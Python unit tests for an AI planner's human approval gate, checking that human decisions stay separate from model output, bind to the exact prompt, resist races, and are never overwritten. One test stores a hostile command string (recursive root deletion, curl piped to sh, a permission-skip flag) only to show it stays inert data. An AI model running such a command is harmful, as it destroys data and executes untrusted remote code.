"""The human authority gate: separate from model output, bound to it, inert.

The properties under test are the ones a confirmation layer gets wrong quietly:

* a person's approval written *over* the model's result, so that a month later
  nobody can say what was actually proposed;
* an approval that survives the prompt changing underneath it;
* a second, contradicting decision silently replacing the first;
* two taps on a phone becoming two approvals, or one approval and one error;
* an approval that turns out to have started something;
* ``STOP``, ``failed`` and ``rejected`` collapsing into one idea.

No provider is invoked anywhere in this file. Every fixture is a *persisted
planner result*, written straight into the store, because what is being tested is
what happens after a planning turn rather than the turn itself.
"""

from __future__ import annotations

import inspect
import sqlite3
import threading
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from cofferdam.workstation.planner import (
    ACTION_ASK_USER,
    ACTION_PREPARE_WORKER_PROMPT,
    ACTION_STOP,
    AUTHORITY_ACTIONS,
    GATE_ANSWER,
    GATE_CONFIRMATION,
    GATE_NONE,
    GATE_STATE_ANSWERED,
    GATE_STATE_APPROVED,
    GATE_STATE_AWAITING_ANSWER,
    GATE_STATE_AWAITING_CONFIRMATION,
    GATE_STATE_NOT_REQUIRED,
    GATE_STATE_REJECTED,
    MAX_ANSWER_CHARS,
    PLANNER_RESULT_SCHEMA_VERSION,
    AuthorityProvenance,
    PlannerAuthorityConflict,
    PlannerAuthorityInvalid,
    PlannerAuthorityRefused,
    PlannerAuthorityService,
    PlannerAuthorityStale,
    PlannerResult,
    PlannerStore,
    ProviderExecution,
    authority_subject_fingerprint,
    new_planner_request_id,
)
from cofferdam.workstation.planner.authority import (
    ACCEPTED_AUTHORITY_SOURCES,
    NO_GATE_INVOCATION_DID_NOT_SUCCEED,
    NO_GATE_PLANNER_STOPPED,
    NO_GATE_RESULT_INCOMPLETE,
    NO_GATE_RESULT_SCHEMA_UNSUPPORTED,
    SOURCE_WORKSTATION_PWA,
    new_authority_event_id,
)
from cofferdam.workstation.planner.store import (
    STATUS_FAILED,
    STATUS_INTERRUPTED,
    STATUS_SUCCEEDED,
)


def a_result(action=ACTION_PREPARE_WORKER_PROMPT, **kw) -> PlannerResult:
    values = dict(action=action, summary="a summary", confidence=0.8,
                  decision_basis="because")
    if action == ACTION_PREPARE_WORKER_PROMPT:
        values["worker_prompt"] = "implement the thing"
    elif action == ACTION_ASK_USER:
        values["user_question"] = "sqlite or postgres?"
    values.update(kw)
    return PlannerResult(**values)


def an_execution() -> ProviderExecution:
    return ProviderExecution(
        provider_id="fake", requested_model="opus", actual_model="model-5",
        models_used=("model-5",), session_id="sess_1", duration_ms=10,
    )


class AuthorityHarness(unittest.TestCase):
    """Persisted planner fixtures and the authority service over them."""

    def setUp(self):
        self._tmp = TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        self.dir = Path(self._tmp.name)
        self.store = PlannerStore(self.dir)
        self.authority = PlannerAuthorityService(store=self.store)
        self.who = AuthorityProvenance.internal_test()

    def persisted(self, result=None, *, status=STATUS_SUCCEEDED) -> str:
        request_id = new_planner_request_id()
        self.store.create_request(
            planner_request_id=request_id, workspace_id="ws_1", project_id=None,
            user_intent="bir seyler yapalim", request_payload={},
            projection_policy_id="policy_1", projection_built_at="2026-08-20T00:00:00Z",
            created_at="2026-08-20T00:00:00Z",
        )
        self.store.mark_running(request_id, started_at="2026-08-20T00:00:01Z")
        if status == STATUS_SUCCEEDED:
            self.store.record_success(
                request_id, result=result or a_result(), execution=an_execution(),
                completed_at="2026-08-20T00:00:02Z",
            )
        elif status == STATUS_FAILED:
            self.store.record_failure(
                request_id, failure_code="planner_invocation_failed",
                failure_message="provider exited 2",
                completed_at="2026-08-20T00:00:02Z",
            )
        elif status == STATUS_INTERRUPTED:
            self.store.mark_interrupted(completed_at="2026-08-20T00:00:02Z")
        return request_id

    def prompt_request(self, prompt="implement the thing") -> str:
        return self.persisted(a_result(ACTION_PREPARE_WORKER_PROMPT,
                                       worker_prompt=prompt))

    def question_request(self, question="sqlite or postgres?") -> str:
        return self.persisted(a_result(ACTION_ASK_USER, user_question=question))

    def rows(self, table: str) -> int:
        connection = sqlite3.connect(self.store.path)
        try:
            return connection.execute(f"SELECT COUNT(*) FROM {table}").fetchone()[0]
        finally:
            connection.close()


# -- 3-5, 19, 30-31. gate derivation -----------------------------------------


class GateDerivation(AuthorityHarness):
    def test_ask_user_derives_an_answer_gate(self):
        gate = self.authority.gate(self.question_request())
        self.assertEqual(gate.kind, GATE_ANSWER)
        self.assertEqual(gate.state, GATE_STATE_AWAITING_ANSWER)
        self.assertTrue(gate.required)
        self.assertTrue(gate.awaiting_human)
        self.assertEqual(gate.permitted_actions, ("answer",))

    def test_prepare_worker_prompt_derives_a_confirmation_gate(self):
        gate = self.authority.gate(self.prompt_request())
        self.assertEqual(gate.kind, GATE_CONFIRMATION)
        self.assertEqual(gate.state, GATE_STATE_AWAITING_CONFIRMATION)
        self.assertEqual(gate.permitted_actions, ("approve", "reject"))

    def test_stop_requires_no_gate(self):
        gate = self.authority.gate(self.persisted(a_result(ACTION_STOP)))
        self.assertEqual(gate.kind, GATE_NONE)
        self.assertEqual(gate.state, GATE_STATE_NOT_REQUIRED)
        self.assertFalse(gate.required)
        self.assertFalse(gate.awaiting_human)
        self.assertEqual(gate.permitted_actions, ())

    def test_stop_is_not_rejected_and_not_failed(self):
        """Three different facts, and this milestone keeps three words."""
        stopped = self.authority.gate(self.persisted(a_result(ACTION_STOP)))
        failed = self.authority.gate(self.persisted(status=STATUS_FAILED))
        rejected_id = self.prompt_request()
        self.authority.reject_prepared_worker_prompt(rejected_id, provenance=self.who)
        rejected = self.authority.gate(rejected_id)

        self.assertEqual(stopped.no_gate_reason, NO_GATE_PLANNER_STOPPED)
        self.assertEqual(failed.no_gate_reason, NO_GATE_INVOCATION_DID_NOT_SUCCEED)
        self.assertEqual(rejected.state, GATE_STATE_REJECTED)
        self.assertNotEqual(stopped.state, rejected.state)
        self.assertNotEqual(failed.state, rejected.state)
        # And the planner row still says STOP, which is not a human decision.
        self.assertEqual(
            self.store.get(stopped.planner_request_id).action, ACTION_STOP
        )

    def test_a_failed_invocation_has_no_gate(self):
        gate = self.authority.gate(self.persisted(status=STATUS_FAILED))
        self.assertEqual(gate.kind, GATE_NONE)
        self.assertEqual(gate.no_gate_reason, NO_GATE_INVOCATION_DID_NOT_SUCCEED)

    def test_an_interrupted_invocation_has_no_gate(self):
        gate = self.authority.gate(self.persisted(status=STATUS_INTERRUPTED))
        self.assertEqual(gate.kind, GATE_NONE)
        self.assertEqual(gate.no_gate_reason, NO_GATE_INVOCATION_DID_NOT_SUCCEED)

    def test_a_result_missing_its_artefact_yields_no_gate(self):
        """Should be impossible after validation, so it is refused, not guessed."""
        request_id = self.prompt_request()
        self._corrupt(request_id, "worker_prompt", None)
        gate = self.authority.gate(request_id)
        self.assertEqual(gate.kind, GATE_NONE)
        self.assertEqual(gate.no_gate_reason, NO_GATE_RESULT_INCOMPLETE)

    def test_a_question_missing_its_text_yields_no_gate(self):
        request_id = self.question_request()
        self._corrupt(request_id, "user_question", "   ")
        gate = self.authority.gate(request_id)
        self.assertEqual(gate.no_gate_reason, NO_GATE_RESULT_INCOMPLETE)

    def test_a_result_speaking_another_schema_yields_no_gate(self):
        request_id = self.prompt_request()
        self._corrupt(request_id, "result_schema_version",
                      PLANNER_RESULT_SCHEMA_VERSION + 1)
        gate = self.authority.gate(request_id)
        self.assertEqual(gate.no_gate_reason, NO_GATE_RESULT_SCHEMA_UNSUPPORTED)

    def test_the_caller_cannot_choose_the_gate(self):
        """No parameter anywhere reinterprets one action as the other."""
        for method in (
            PlannerAuthorityService.answer_planner_question,
            PlannerAuthorityService.approve_prepared_worker_prompt,
            PlannerAuthorityService.reject_prepared_worker_prompt,
        ):
            params = set(inspect.signature(method).parameters)
            for forbidden in ("gate_kind", "action", "as_action", "treat_as",
                              "gate", "override"):
                self.assertNotIn(forbidden, params, f"{method.__name__} takes {forbidden}")

    def test_an_unknown_request_has_no_gate(self):
        self.assertIsNone(self.authority.gate("plan_does_not_exist"))
        self.assertIsNone(self.authority.view("plan_does_not_exist"))

    def _corrupt(self, request_id, column, value):
        """Write a row shape validation would never have produced.

        Direct SQL on purpose: the service must fail closed on a row it did not
        write, and there is no supported API that could create one.
        """
        connection = sqlite3.connect(self.store.path)
        try:
            connection.execute(
                f"UPDATE planner_requests SET {column} = ? WHERE planner_request_id = ?",
                (value, request_id),
            )
            connection.commit()
        finally:
            connection.close()


# -- 6-8, 25. the three decisions persist ------------------------------------


class DecisionsPersist(AuthorityHarness):
    def test_an_answer_persists(self):
        request_id = self.question_request()
        gate = self.authority.answer_planner_question(
            request_id, answer="postgres, çünkü ilişkisel sorgular lazım",
            provenance=self.who,
        )
        self.assertEqual(gate.state, GATE_STATE_ANSWERED)
        reloaded = PlannerAuthorityService(store=PlannerStore(self.dir)).gate(request_id)
        self.assertEqual(reloaded.state, GATE_STATE_ANSWERED)
        self.assertEqual(
            reloaded.event.answer_text, "postgres, çünkü ilişkisel sorgular lazım"
        )

    def test_an_approval_persists(self):
        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        reloaded = PlannerAuthorityService(store=PlannerStore(self.dir)).gate(request_id)
        self.assertEqual(reloaded.state, GATE_STATE_APPROVED)
        self.assertEqual(reloaded.event.authority_action, "approve")

    def test_a_rejection_persists_with_its_reason(self):
        request_id = self.prompt_request()
        gate = self.authority.reject_prepared_worker_prompt(
            request_id, reason="scope is wider than I asked for", provenance=self.who
        )
        self.assertEqual(gate.state, GATE_STATE_REJECTED)
        reloaded = PlannerAuthorityService(store=PlannerStore(self.dir)).gate(request_id)
        self.assertEqual(reloaded.event.rejection_reason,
                         "scope is wider than I asked for")

    def test_a_rejection_needs_no_reason(self):
        gate = self.authority.reject_prepared_worker_prompt(
            self.prompt_request(), provenance=self.who
        )
        self.assertEqual(gate.state, GATE_STATE_REJECTED)
        self.assertIsNone(gate.event.rejection_reason)

    def test_provenance_persists(self):
        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        event = self.store.authority_event(request_id)
        self.assertEqual(event.actor, "user")
        self.assertEqual(event.source, "internal_test")
        self.assertTrue(event.recorded_at)

    def test_the_decision_carries_its_own_identity(self):
        request_id = self.prompt_request()
        gate = self.authority.approve_prepared_worker_prompt(
            request_id, provenance=self.who
        )
        self.assertTrue(gate.event.authority_event_id.startswith("auth_"))
        self.assertNotEqual(gate.event.authority_event_id, request_id)

    def test_event_ids_are_unique_and_carry_no_content(self):
        self.assertEqual(set(inspect.signature(new_authority_event_id).parameters),
                         set())
        self.assertEqual(len({new_authority_event_id() for _ in range(2000)}), 2000)


# -- the core rule: model output is never rewritten --------------------------


class ModelOutputIsNotRewritten(AuthorityHarness):
    """What the planner said and what the person authorized are two facts."""

    def test_approval_does_not_touch_the_planner_row(self):
        request_id = self.prompt_request()
        before = self.store.get(request_id).to_dict()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        self.assertEqual(self.store.get(request_id).to_dict(), before)

    def test_rejection_does_not_blank_the_prepared_prompt(self):
        request_id = self.prompt_request()
        self.authority.reject_prepared_worker_prompt(
            request_id, reason="no", provenance=self.who
        )
        record = self.store.get(request_id)
        self.assertEqual(record.worker_prompt, "implement the thing")
        self.assertEqual(record.action, ACTION_PREPARE_WORKER_PROMPT)

    def test_an_answer_does_not_overwrite_the_question(self):
        request_id = self.question_request()
        self.authority.answer_planner_question(
            request_id, answer="postgres", provenance=self.who
        )
        self.assertEqual(self.store.get(request_id).user_question, "sqlite or postgres?")

    def test_the_planner_action_never_becomes_a_human_word(self):
        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        self.assertNotIn(
            self.store.get(request_id).action,
            ("approved", "rejected", "answered", "APPROVED", "REJECTED"),
        )

    def test_the_two_facts_stay_in_separate_tables(self):
        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        self.assertEqual(self.rows("planner_requests"), 1)
        self.assertEqual(self.rows("planner_authority_events"), 1)

    def test_the_read_model_keeps_them_apart(self):
        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        payload = self.authority.view(request_id).to_dict()
        self.assertEqual(set(payload), {"planner_request", "human_gate"})
        self.assertEqual(payload["planner_request"]["action"],
                         ACTION_PREPARE_WORKER_PROMPT)
        self.assertEqual(payload["human_gate"]["gate_state"], GATE_STATE_APPROVED)


# -- 9-13. hash binding ------------------------------------------------------


class HashBinding(AuthorityHarness):
    def test_an_approval_binds_the_exact_prompt(self):
        request_id = self.prompt_request("do exactly this")
        gate = self.authority.approve_prepared_worker_prompt(
            request_id, provenance=self.who
        )
        expected = authority_subject_fingerprint(
            planner_request_id=request_id,
            result_schema_version=PLANNER_RESULT_SCHEMA_VERSION,
            action=ACTION_PREPARE_WORKER_PROMPT,
            subject="do exactly this",
        )
        self.assertEqual(gate.event.subject_fingerprint, expected)
        self.assertTrue(gate.binds_current_subject)

    def test_an_answer_binds_the_exact_question(self):
        request_id = self.question_request("which database?")
        gate = self.authority.answer_planner_question(
            request_id, answer="postgres", provenance=self.who
        )
        expected = authority_subject_fingerprint(
            planner_request_id=request_id,
            result_schema_version=PLANNER_RESULT_SCHEMA_VERSION,
            action=ACTION_ASK_USER,
            subject="which database?",
        )
        self.assertEqual(gate.event.subject_fingerprint, expected)
        self.assertTrue(gate.binds_current_subject)

    def test_a_changed_prompt_cannot_reuse_an_approval(self):
        """The property a future dispatcher must be able to prove."""
        request_id = self.prompt_request("do exactly this")
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)

        connection = sqlite3.connect(self.store.path)
        connection.execute(
            "UPDATE planner_requests SET worker_prompt = ? "
            "WHERE planner_request_id = ?",
            ("do something else entirely", request_id),
        )
        connection.commit()
        connection.close()

        gate = self.authority.gate(request_id)
        self.assertFalse(gate.binds_current_subject)
        self.assertNotEqual(gate.subject_fingerprint, gate.event.subject_fingerprint)
        # The record is not corrupted — it still says truthfully what was
        # approved. What changed is the subject.
        self.assertEqual(gate.state, GATE_STATE_APPROVED)

    def test_a_wrong_prompt_fingerprint_is_refused(self):
        request_id = self.prompt_request()
        with self.assertRaises(PlannerAuthorityStale):
            self.authority.approve_prepared_worker_prompt(
                request_id, provenance=self.who, expected_subject_fingerprint="0" * 64
            )
        self.assertIsNone(self.store.authority_event(request_id))

    def test_a_wrong_question_fingerprint_is_refused(self):
        request_id = self.question_request()
        with self.assertRaises(PlannerAuthorityStale):
            self.authority.answer_planner_question(
                request_id, answer="postgres", provenance=self.who,
                expected_subject_fingerprint="a" * 64,
            )
        self.assertIsNone(self.store.authority_event(request_id))

    def test_a_malformed_fingerprint_is_refused_as_invalid(self):
        request_id = self.prompt_request()
        with self.assertRaises(PlannerAuthorityInvalid):
            self.authority.approve_prepared_worker_prompt(
                request_id, provenance=self.who, expected_subject_fingerprint="nope"
            )

    def test_the_matching_fingerprint_is_accepted(self):
        request_id = self.prompt_request()
        gate = self.authority.gate(request_id)
        decided = self.authority.approve_prepared_worker_prompt(
            request_id, provenance=self.who,
            expected_subject_fingerprint=gate.subject_fingerprint,
        )
        self.assertEqual(decided.state, GATE_STATE_APPROVED)

    def test_identical_prompts_in_different_requests_do_not_share_a_fingerprint(self):
        first = self.authority.gate(self.prompt_request("same text"))
        second = self.authority.gate(self.prompt_request("same text"))
        self.assertNotEqual(first.subject_fingerprint, second.subject_fingerprint)

    def test_a_question_and_a_prompt_cannot_collide(self):
        """The action is bound in, so identical text is still different authority."""
        request_id = new_planner_request_id()
        as_prompt = authority_subject_fingerprint(
            planner_request_id=request_id, result_schema_version=1,
            action=ACTION_PREPARE_WORKER_PROMPT, subject="identical",
        )
        as_question = authority_subject_fingerprint(
            planner_request_id=request_id, result_schema_version=1,
            action=ACTION_ASK_USER, subject="identical",
        )
        self.assertNotEqual(as_prompt, as_question)

    def test_fields_cannot_alias_across_the_length_prefix(self):
        """`plan_ab` + `c` must not hash the same bytes as `plan_a` + `bc`."""
        left = authority_subject_fingerprint(
            planner_request_id="plan_ab", result_schema_version=1,
            action=ACTION_STOP, subject="c",
        )
        right = authority_subject_fingerprint(
            planner_request_id="plan_a", result_schema_version=1,
            action=ACTION_STOP, subject="bc",
        )
        self.assertNotEqual(left, right)

    def test_whitespace_is_not_normalized_away(self):
        """A change Cofferdam thought cosmetic must not ride in on an approval."""
        base = dict(planner_request_id="plan_x", result_schema_version=1,
                    action=ACTION_PREPARE_WORKER_PROMPT)
        self.assertNotEqual(
            authority_subject_fingerprint(subject="do X", **base),
            authority_subject_fingerprint(subject="do X ", **base),
        )


# -- 14-17. invalid actions refused without mutation -------------------------


class InvalidActionsRefused(AuthorityHarness):
    def assert_untouched(self, request_id):
        self.assertIsNone(self.store.authority_event(request_id))
        self.assertEqual(self.rows("planner_authority_events"), 0)

    def test_answer_against_a_prepared_prompt_is_refused(self):
        request_id = self.prompt_request()
        with self.assertRaises(PlannerAuthorityRefused):
            self.authority.answer_planner_question(
                request_id, answer="sure", provenance=self.who
            )
        self.assert_untouched(request_id)

    def test_approve_against_a_question_is_refused(self):
        request_id = self.question_request()
        with self.assertRaises(PlannerAuthorityRefused):
            self.authority.approve_prepared_worker_prompt(
                request_id, provenance=self.who
            )
        self.assert_untouched(request_id)

    def test_reject_against_a_question_is_refused(self):
        request_id = self.question_request()
        with self.assertRaises(PlannerAuthorityRefused):
            self.authority.reject_prepared_worker_prompt(
                request_id, provenance=self.who
            )
        self.assert_untouched(request_id)

    def test_every_action_against_stop_is_refused(self):
        request_id = self.persisted(a_result(ACTION_STOP))
        for call in (
            lambda: self.authority.answer_planner_question(
                request_id, answer="x", provenance=self.who),
            lambda: self.authority.approve_prepared_worker_prompt(
                request_id, provenance=self.who),
            lambda: self.authority.reject_prepared_worker_prompt(
                request_id, provenance=self.who),
        ):
            with self.assertRaises(PlannerAuthorityRefused):
                call()
        self.assert_untouched(request_id)

    def test_every_action_against_a_failed_invocation_is_refused(self):
        request_id = self.persisted(status=STATUS_FAILED)
        with self.assertRaises(PlannerAuthorityRefused):
            self.authority.approve_prepared_worker_prompt(
                request_id, provenance=self.who)
        with self.assertRaises(PlannerAuthorityRefused):
            self.authority.answer_planner_question(
                request_id, answer="x", provenance=self.who)
        self.assert_untouched(request_id)

    def test_every_action_against_an_interrupted_invocation_is_refused(self):
        request_id = self.persisted(status=STATUS_INTERRUPTED)
        with self.assertRaises(PlannerAuthorityRefused):
            self.authority.reject_prepared_worker_prompt(
                request_id, provenance=self.who)
        self.assert_untouched(request_id)

    def test_a_nonexistent_request_is_refused(self):
        with self.assertRaises(PlannerAuthorityRefused):
            self.authority.approve_prepared_worker_prompt(
                "plan_nope", provenance=self.who)
        self.assertEqual(self.rows("planner_authority_events"), 0)

    def test_approval_with_no_prompt_is_refused(self):
        request_id = self.prompt_request()
        connection = sqlite3.connect(self.store.path)
        connection.execute(
            "UPDATE planner_requests SET worker_prompt = NULL "
            "WHERE planner_request_id = ?", (request_id,))
        connection.commit()
        connection.close()
        with self.assertRaises(PlannerAuthorityRefused):
            self.authority.approve_prepared_worker_prompt(
                request_id, provenance=self.who)
        self.assert_untouched(request_id)

    def test_answer_with_no_question_is_refused(self):
        request_id = self.question_request()
        connection = sqlite3.connect(self.store.path)
        connection.execute(
            "UPDATE planner_requests SET user_question = NULL "
            "WHERE planner_request_id = ?", (request_id,))
        connection.commit()
        connection.close()
        with self.assertRaises(PlannerAuthorityRefused):
            self.authority.answer_planner_question(
                request_id, answer="x", provenance=self.who)
        self.assert_untouched(request_id)

    def test_a_result_this_build_cannot_read_is_refused(self):
        request_id = self.prompt_request()
        connection = sqlite3.connect(self.store.path)
        connection.execute(
            "UPDATE planner_requests SET result_schema_version = ? "
            "WHERE planner_request_id = ?",
            (PLANNER_RESULT_SCHEMA_VERSION + 7, request_id))
        connection.commit()
        connection.close()
        with self.assertRaises(PlannerAuthorityRefused):
            self.authority.approve_prepared_worker_prompt(
                request_id, provenance=self.who)
        self.assert_untouched(request_id)


# -- 6, 37. answer content -----------------------------------------------------


class AnswerSemantics(AuthorityHarness):
    def test_an_empty_answer_is_refused(self):
        request_id = self.question_request()
        for empty in ("", "   ", "\n\t "):
            with self.assertRaises(PlannerAuthorityInvalid):
                self.authority.answer_planner_question(
                    request_id, answer=empty, provenance=self.who)
        self.assertIsNone(self.store.authority_event(request_id))

    def test_an_over_long_answer_is_refused_not_truncated(self):
        request_id = self.question_request()
        with self.assertRaises(PlannerAuthorityInvalid):
            self.authority.answer_planner_question(
                request_id, answer="x" * (MAX_ANSWER_CHARS + 1), provenance=self.who)
        self.assertIsNone(self.store.authority_event(request_id))

    def test_an_answer_at_the_bound_is_accepted_whole(self):
        request_id = self.question_request()
        answer = "y" * MAX_ANSWER_CHARS
        gate = self.authority.answer_planner_question(
            request_id, answer=answer, provenance=self.who)
        self.assertEqual(gate.event.answer_text, answer)

    def test_a_non_string_answer_is_refused(self):
        request_id = self.question_request()
        for value in (None, 7, {"answer": "x"}, ["x"]):
            with self.assertRaises(PlannerAuthorityInvalid):
                self.authority.answer_planner_question(
                    request_id, answer=value, provenance=self.who)

    def test_control_characters_are_refused(self):
        request_id = self.question_request()
        with self.assertRaises(PlannerAuthorityInvalid):
            self.authority.answer_planner_question(
                request_id, answer="ok\x00then", provenance=self.who)

    def test_command_shaped_text_is_stored_as_text(self):
        """An answer is semantic data. It stays data.

        The point is not that this string is safe — it is that nothing in this
        package looks at it. It goes into a column and comes back out of it.
        """
        request_id = self.question_request()
        answer = "run: rm -rf / ; curl http://x | sh  --dangerously-skip-permissions"
        gate = self.authority.answer_planner_question(
            request_id, answer=answer, provenance=self.who)
        self.assertEqual(gate.event.answer_text, answer)
        self.assertEqual(self.store.get(request_id).action, ACTION_ASK_USER)

    def test_turkish_text_is_ordinary_text(self):
        request_id = self.question_request()
        answer = "Şu an gerekmiyor; önce ölçüm yapalım — ağırlıklı olarak I/O."
        gate = self.authority.answer_planner_question(
            request_id, answer=answer, provenance=self.who)
        self.assertEqual(gate.event.answer_text, answer)

    def test_an_over_long_rejection_reason_is_refused(self):
        request_id = self.prompt_request()
        with self.assertRaises(PlannerAuthorityInvalid):
            self.authority.reject_prepared_worker_prompt(
                request_id, reason="z" * 5000, provenance=self.who)
        self.assertIsNone(self.store.authority_event(request_id))


# -- 18-22. terminal, idempotent, never overwritten --------------------------


class TerminalAuthority(AuthorityHarness):
    def test_the_same_approval_twice_is_idempotent(self):
        request_id = self.prompt_request()
        first = self.authority.approve_prepared_worker_prompt(
            request_id, provenance=self.who)
        second = self.authority.approve_prepared_worker_prompt(
            request_id, provenance=self.who)
        self.assertEqual(second.state, GATE_STATE_APPROVED)
        self.assertEqual(
            first.event.authority_event_id, second.event.authority_event_id
        )
        self.assertEqual(self.rows("planner_authority_events"), 1)

    def test_the_same_rejection_twice_is_idempotent(self):
        request_id = self.prompt_request()
        self.authority.reject_prepared_worker_prompt(request_id, provenance=self.who)
        again = self.authority.reject_prepared_worker_prompt(
            request_id, provenance=self.who)
        self.assertEqual(again.state, GATE_STATE_REJECTED)
        self.assertEqual(self.rows("planner_authority_events"), 1)

    def test_a_second_answer_does_not_replace_the_first(self):
        request_id = self.question_request()
        self.authority.answer_planner_question(
            request_id, answer="the first answer", provenance=self.who)
        again = self.authority.answer_planner_question(
            request_id, answer="a completely different answer", provenance=self.who)
        # Idempotent by action, and the stored text is still the original.
        self.assertEqual(again.event.answer_text, "the first answer")
        self.assertEqual(self.rows("planner_authority_events"), 1)

    def test_approve_then_reject_is_refused(self):
        request_id = self.prompt_request()
        self.authority.approve_prepared_worker_prompt(request_id, provenance=self.who)
        with self.assertRaises(PlannerAuthorityConflict):
            self.authority.reject_prepared_worker_prompt(
                request_id, provenance=self.who)
        self.assertEqual(self.authority.gate(request_id).state, GATE_STATE_APPROVED)
        self.assertEqual(self.rows("planner_authority_events"), 1)

    def test_reject_then_approve_is_refused(self):
        request_id = self.prompt_request()
        self.authority.reject_prepared_worker_prompt(
            request_id, reason="no", provenance=self.who)
        with self.assertRaises(PlannerAuthorityConflict):
            self.authority.approve_prepared_worker_prompt(
                request_id, provenance=self.who)
        gate = self.authority.gate(request_id)
        self.assertEqual(gate.state, GATE_STATE_REJECTED)
        self.assertEqual(gate.event.rejection_reason, "no")

    def test_a_decided_gate_permits_nothing_further(self):
        request_id = self.prompt_request()
        gate = self.authority.approve_prepared_worker_prompt(
            request_id, provenance=self.who)
        self.assertEqual(gate.permitted_actions, ())
        self.assertFalse(gate.awaiting_human)
        self.assertTrue(gate.decided)

    def test_no_correction_primitive_exists(self):
        for forbidden in ("amend", "revise", "correct", "undo", "reopen",
                          "supersede", "delete_decision", "clear"):
            self.assertFalse(hasattr(PlannerAuthorityService, forbidden),
                             f"service exposes {forbidden}")


# -- 10, 43-44. concurrency ---------------------------------------------------


class Concurrency(AuthorityHarness):
    def race(self, calls):
        """Run callables together and collect (result, exception) pairs."""
        outcomes = []
        barrier = threading.Barrier(len(calls))
        lock = threading.Lock()

        def run(call):
            barrier.wait()
            try:
                value, error = call(), None
            except Exception as exc:  # recorded, not swallowed
                value, error = None, exc
            with lock:
                outcomes.append((value, error))

        threads = [threading.Thread(target=run, args=(call,)) for call in calls]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        return outcomes

    def test_two_simultaneous_approvals_produce_one_authority(self):
        request_id = self.prompt_request()
        approve = lambda: self.authority.approve_prepared_worker_prompt(  # noqa: E731
            request_id, provenance=self.who)
        outcomes = self.race([approve] * 6)

        self.assertEqual([error for _, error in outcomes], [None] * 6)
        states = {gate.state for gate, _ in outcomes}
        self.assertEqual(states, {GATE_STATE_APPROVED})
        identities = {gate.event.authority_event_id for gate, _ in outcomes}
        self.assertEqual(len(identities), 1, "a double tap became two approvals")
        self.assertEqual(self.rows("planner_authority_events"), 1)

    def test_approve_and_reject_racing_leaves_exactly_one_winner(self):
        request_id = self.prompt_request()
        outcomes = self.race(
            [lambda: self.authority.approve_prepared_worker_prompt(
                request_id, provenance=self.who)] * 4
            + [lambda: self.authority.reject_prepared_worker_prompt(
                request_id, provenance=self.who)] * 4
        )
        self.assertEqual(self.rows("planner_authority_events"), 1)

        gate = self.authority.gate(request_id)
        self.assertIn(gate.state, (GATE_STATE_APPROVED, GATE_STATE_REJECTED))
        # Everything that did not agree with the winner was refused, and every
        # success reports the same single decision.
        for value, error in outcomes:
            if error is None:
                self.assertEqual(value.state, gate.state)
                self.assertEqual(value.event.authority_event_id,
                                 gate.event.authority_event_id)
            else:
                self.assertIsInstance(error, PlannerAuthorityConflict)

    def test_separate_stores_racing_still_produce_one_authority(self):
        """The exclusivity is SQLite's, not the in-process lock's.

        Every other test in this class shares one :class:`PlannerStore`, whose
        ``RLock`` serializes the writes before they reach the database — so they
        prove the service's behaviour and not the constraint underneath it. Here
        each caller gets its own store, its own lock and its own connection, which
        is what a second process looks like, and the only thing left keeping the
        gate terminal is the unique index.
        """
        request_id = self.prompt_request()
        services = [
            PlannerAuthorityService(store=PlannerStore(self.dir)) for _ in range(4)
        ]
        outcomes = self.race([
            (lambda service=service: service.approve_prepared_worker_prompt(
                request_id, provenance=self.who))
            for service in services
        ])

        self.assertEqual([error for _, error in outcomes], [None] * 4)
        self.assertEqual(self.rows("planner_authority_events"), 1)
        identities = {gate.event.authority_event_id for gate, _ in outcomes}
        self.assertEqual(len(identities), 1)

    def test_concurrent_answers_record_one(self):
        request_id = self.question_request()
        outcomes = self.race(
            [lambda: self.authority.answer_planner_question(
                request_id, answer="first", provenance=self.who),
             lambda: self.authority.answer_planner_question(
                request_id, answer="second", provenance=self.who)]
        )
        self.assertEqual(self.rows("planner_authority_events"), 1)
        stored = {value.event.answer_text for value, error in outcomes
                  if error is None}
        self.assertEqual(len(stored), 1, "two answers were both reported as stored")


# -- 23-24. transactional atomicity ------------------------------------------


class Atomicity(AuthorityHarness):
    def test_the_database_has_no_row_shape_that_spells_an_execution_word(self):
        """A CHECK, not a code path — a future writer cannot forget it."""
        request_id = self.prompt_request()
        with self.assertRaises(sqlite3.IntegrityError):
            self.store.record_authority_event(
                authority_event_id=new_authority_event_id(),
                planner_request_id=request_id,
                gate_kind=GATE_CONFIRMATION,
                authority_action="dispatch",
                subject_fingerprint="0" * 64,
                result_schema_version=1,
                actor="user", source="internal_test",
                recorded_at="2026-08-20T00:00:03Z",
            )
        self.assertEqual(self.rows("planner_authority_events"), 0)
        self.assertEqual(self.authority.gate(request_id).state,
                         GATE_STATE_AWAITING_CONFIRMATION)

    def test_an_incomplete_write_rolls_back_whole(self):
        """An approval carrying answer text violates a CHECK mid-transaction."""
        request_id = self.prompt_request()
        with self.assertRaises(sqlite3.IntegrityError):
            self.store.record_authority_event(
                authority_event_id=new_authority_event_id(),
                planner_request_id=request_id,
                gate_kind=GATE_CONFIRMATION,
                authority_action="approve",
                subject_fingerprint="0" * 64,
                result_schema_version=1,
                actor="user", source="internal_test",
                recorded_at="2026-08-20T00:00:03Z",
                answer_text="an approval does not carry an answer",
            )
        self.assertEqual(self.rows("planner_authority_events"), 0)
        self.assertTrue(self.authority.gate(request_id).awaiting_human)

    def test_a_decision_cannot_be_recorded_against_no_planner_row(self):
        from cofferdam.workstation.planner.store import PlannerStoreUnavailable

        with self.assertRaises(PlannerStoreUnavailable):
            self.store.record_authority_event(
                authority_event_id=new_authority_event_id(),
                planner_request_id="plan_missing",
                gate_kind=GATE_CONFIRMATION, authority_action="approve",
                subject_fingerprint="0" * 64, result_schema_version=1,
                actor="user", source="internal_test",
                recorded_at="2026-08-20T00:00:03Z",
            )
        self.assertEqual(self.rows("planner_authority_events"), 0)

    def test_a_decision_against_a_moved_result_is_refused_inside_the_write(self):
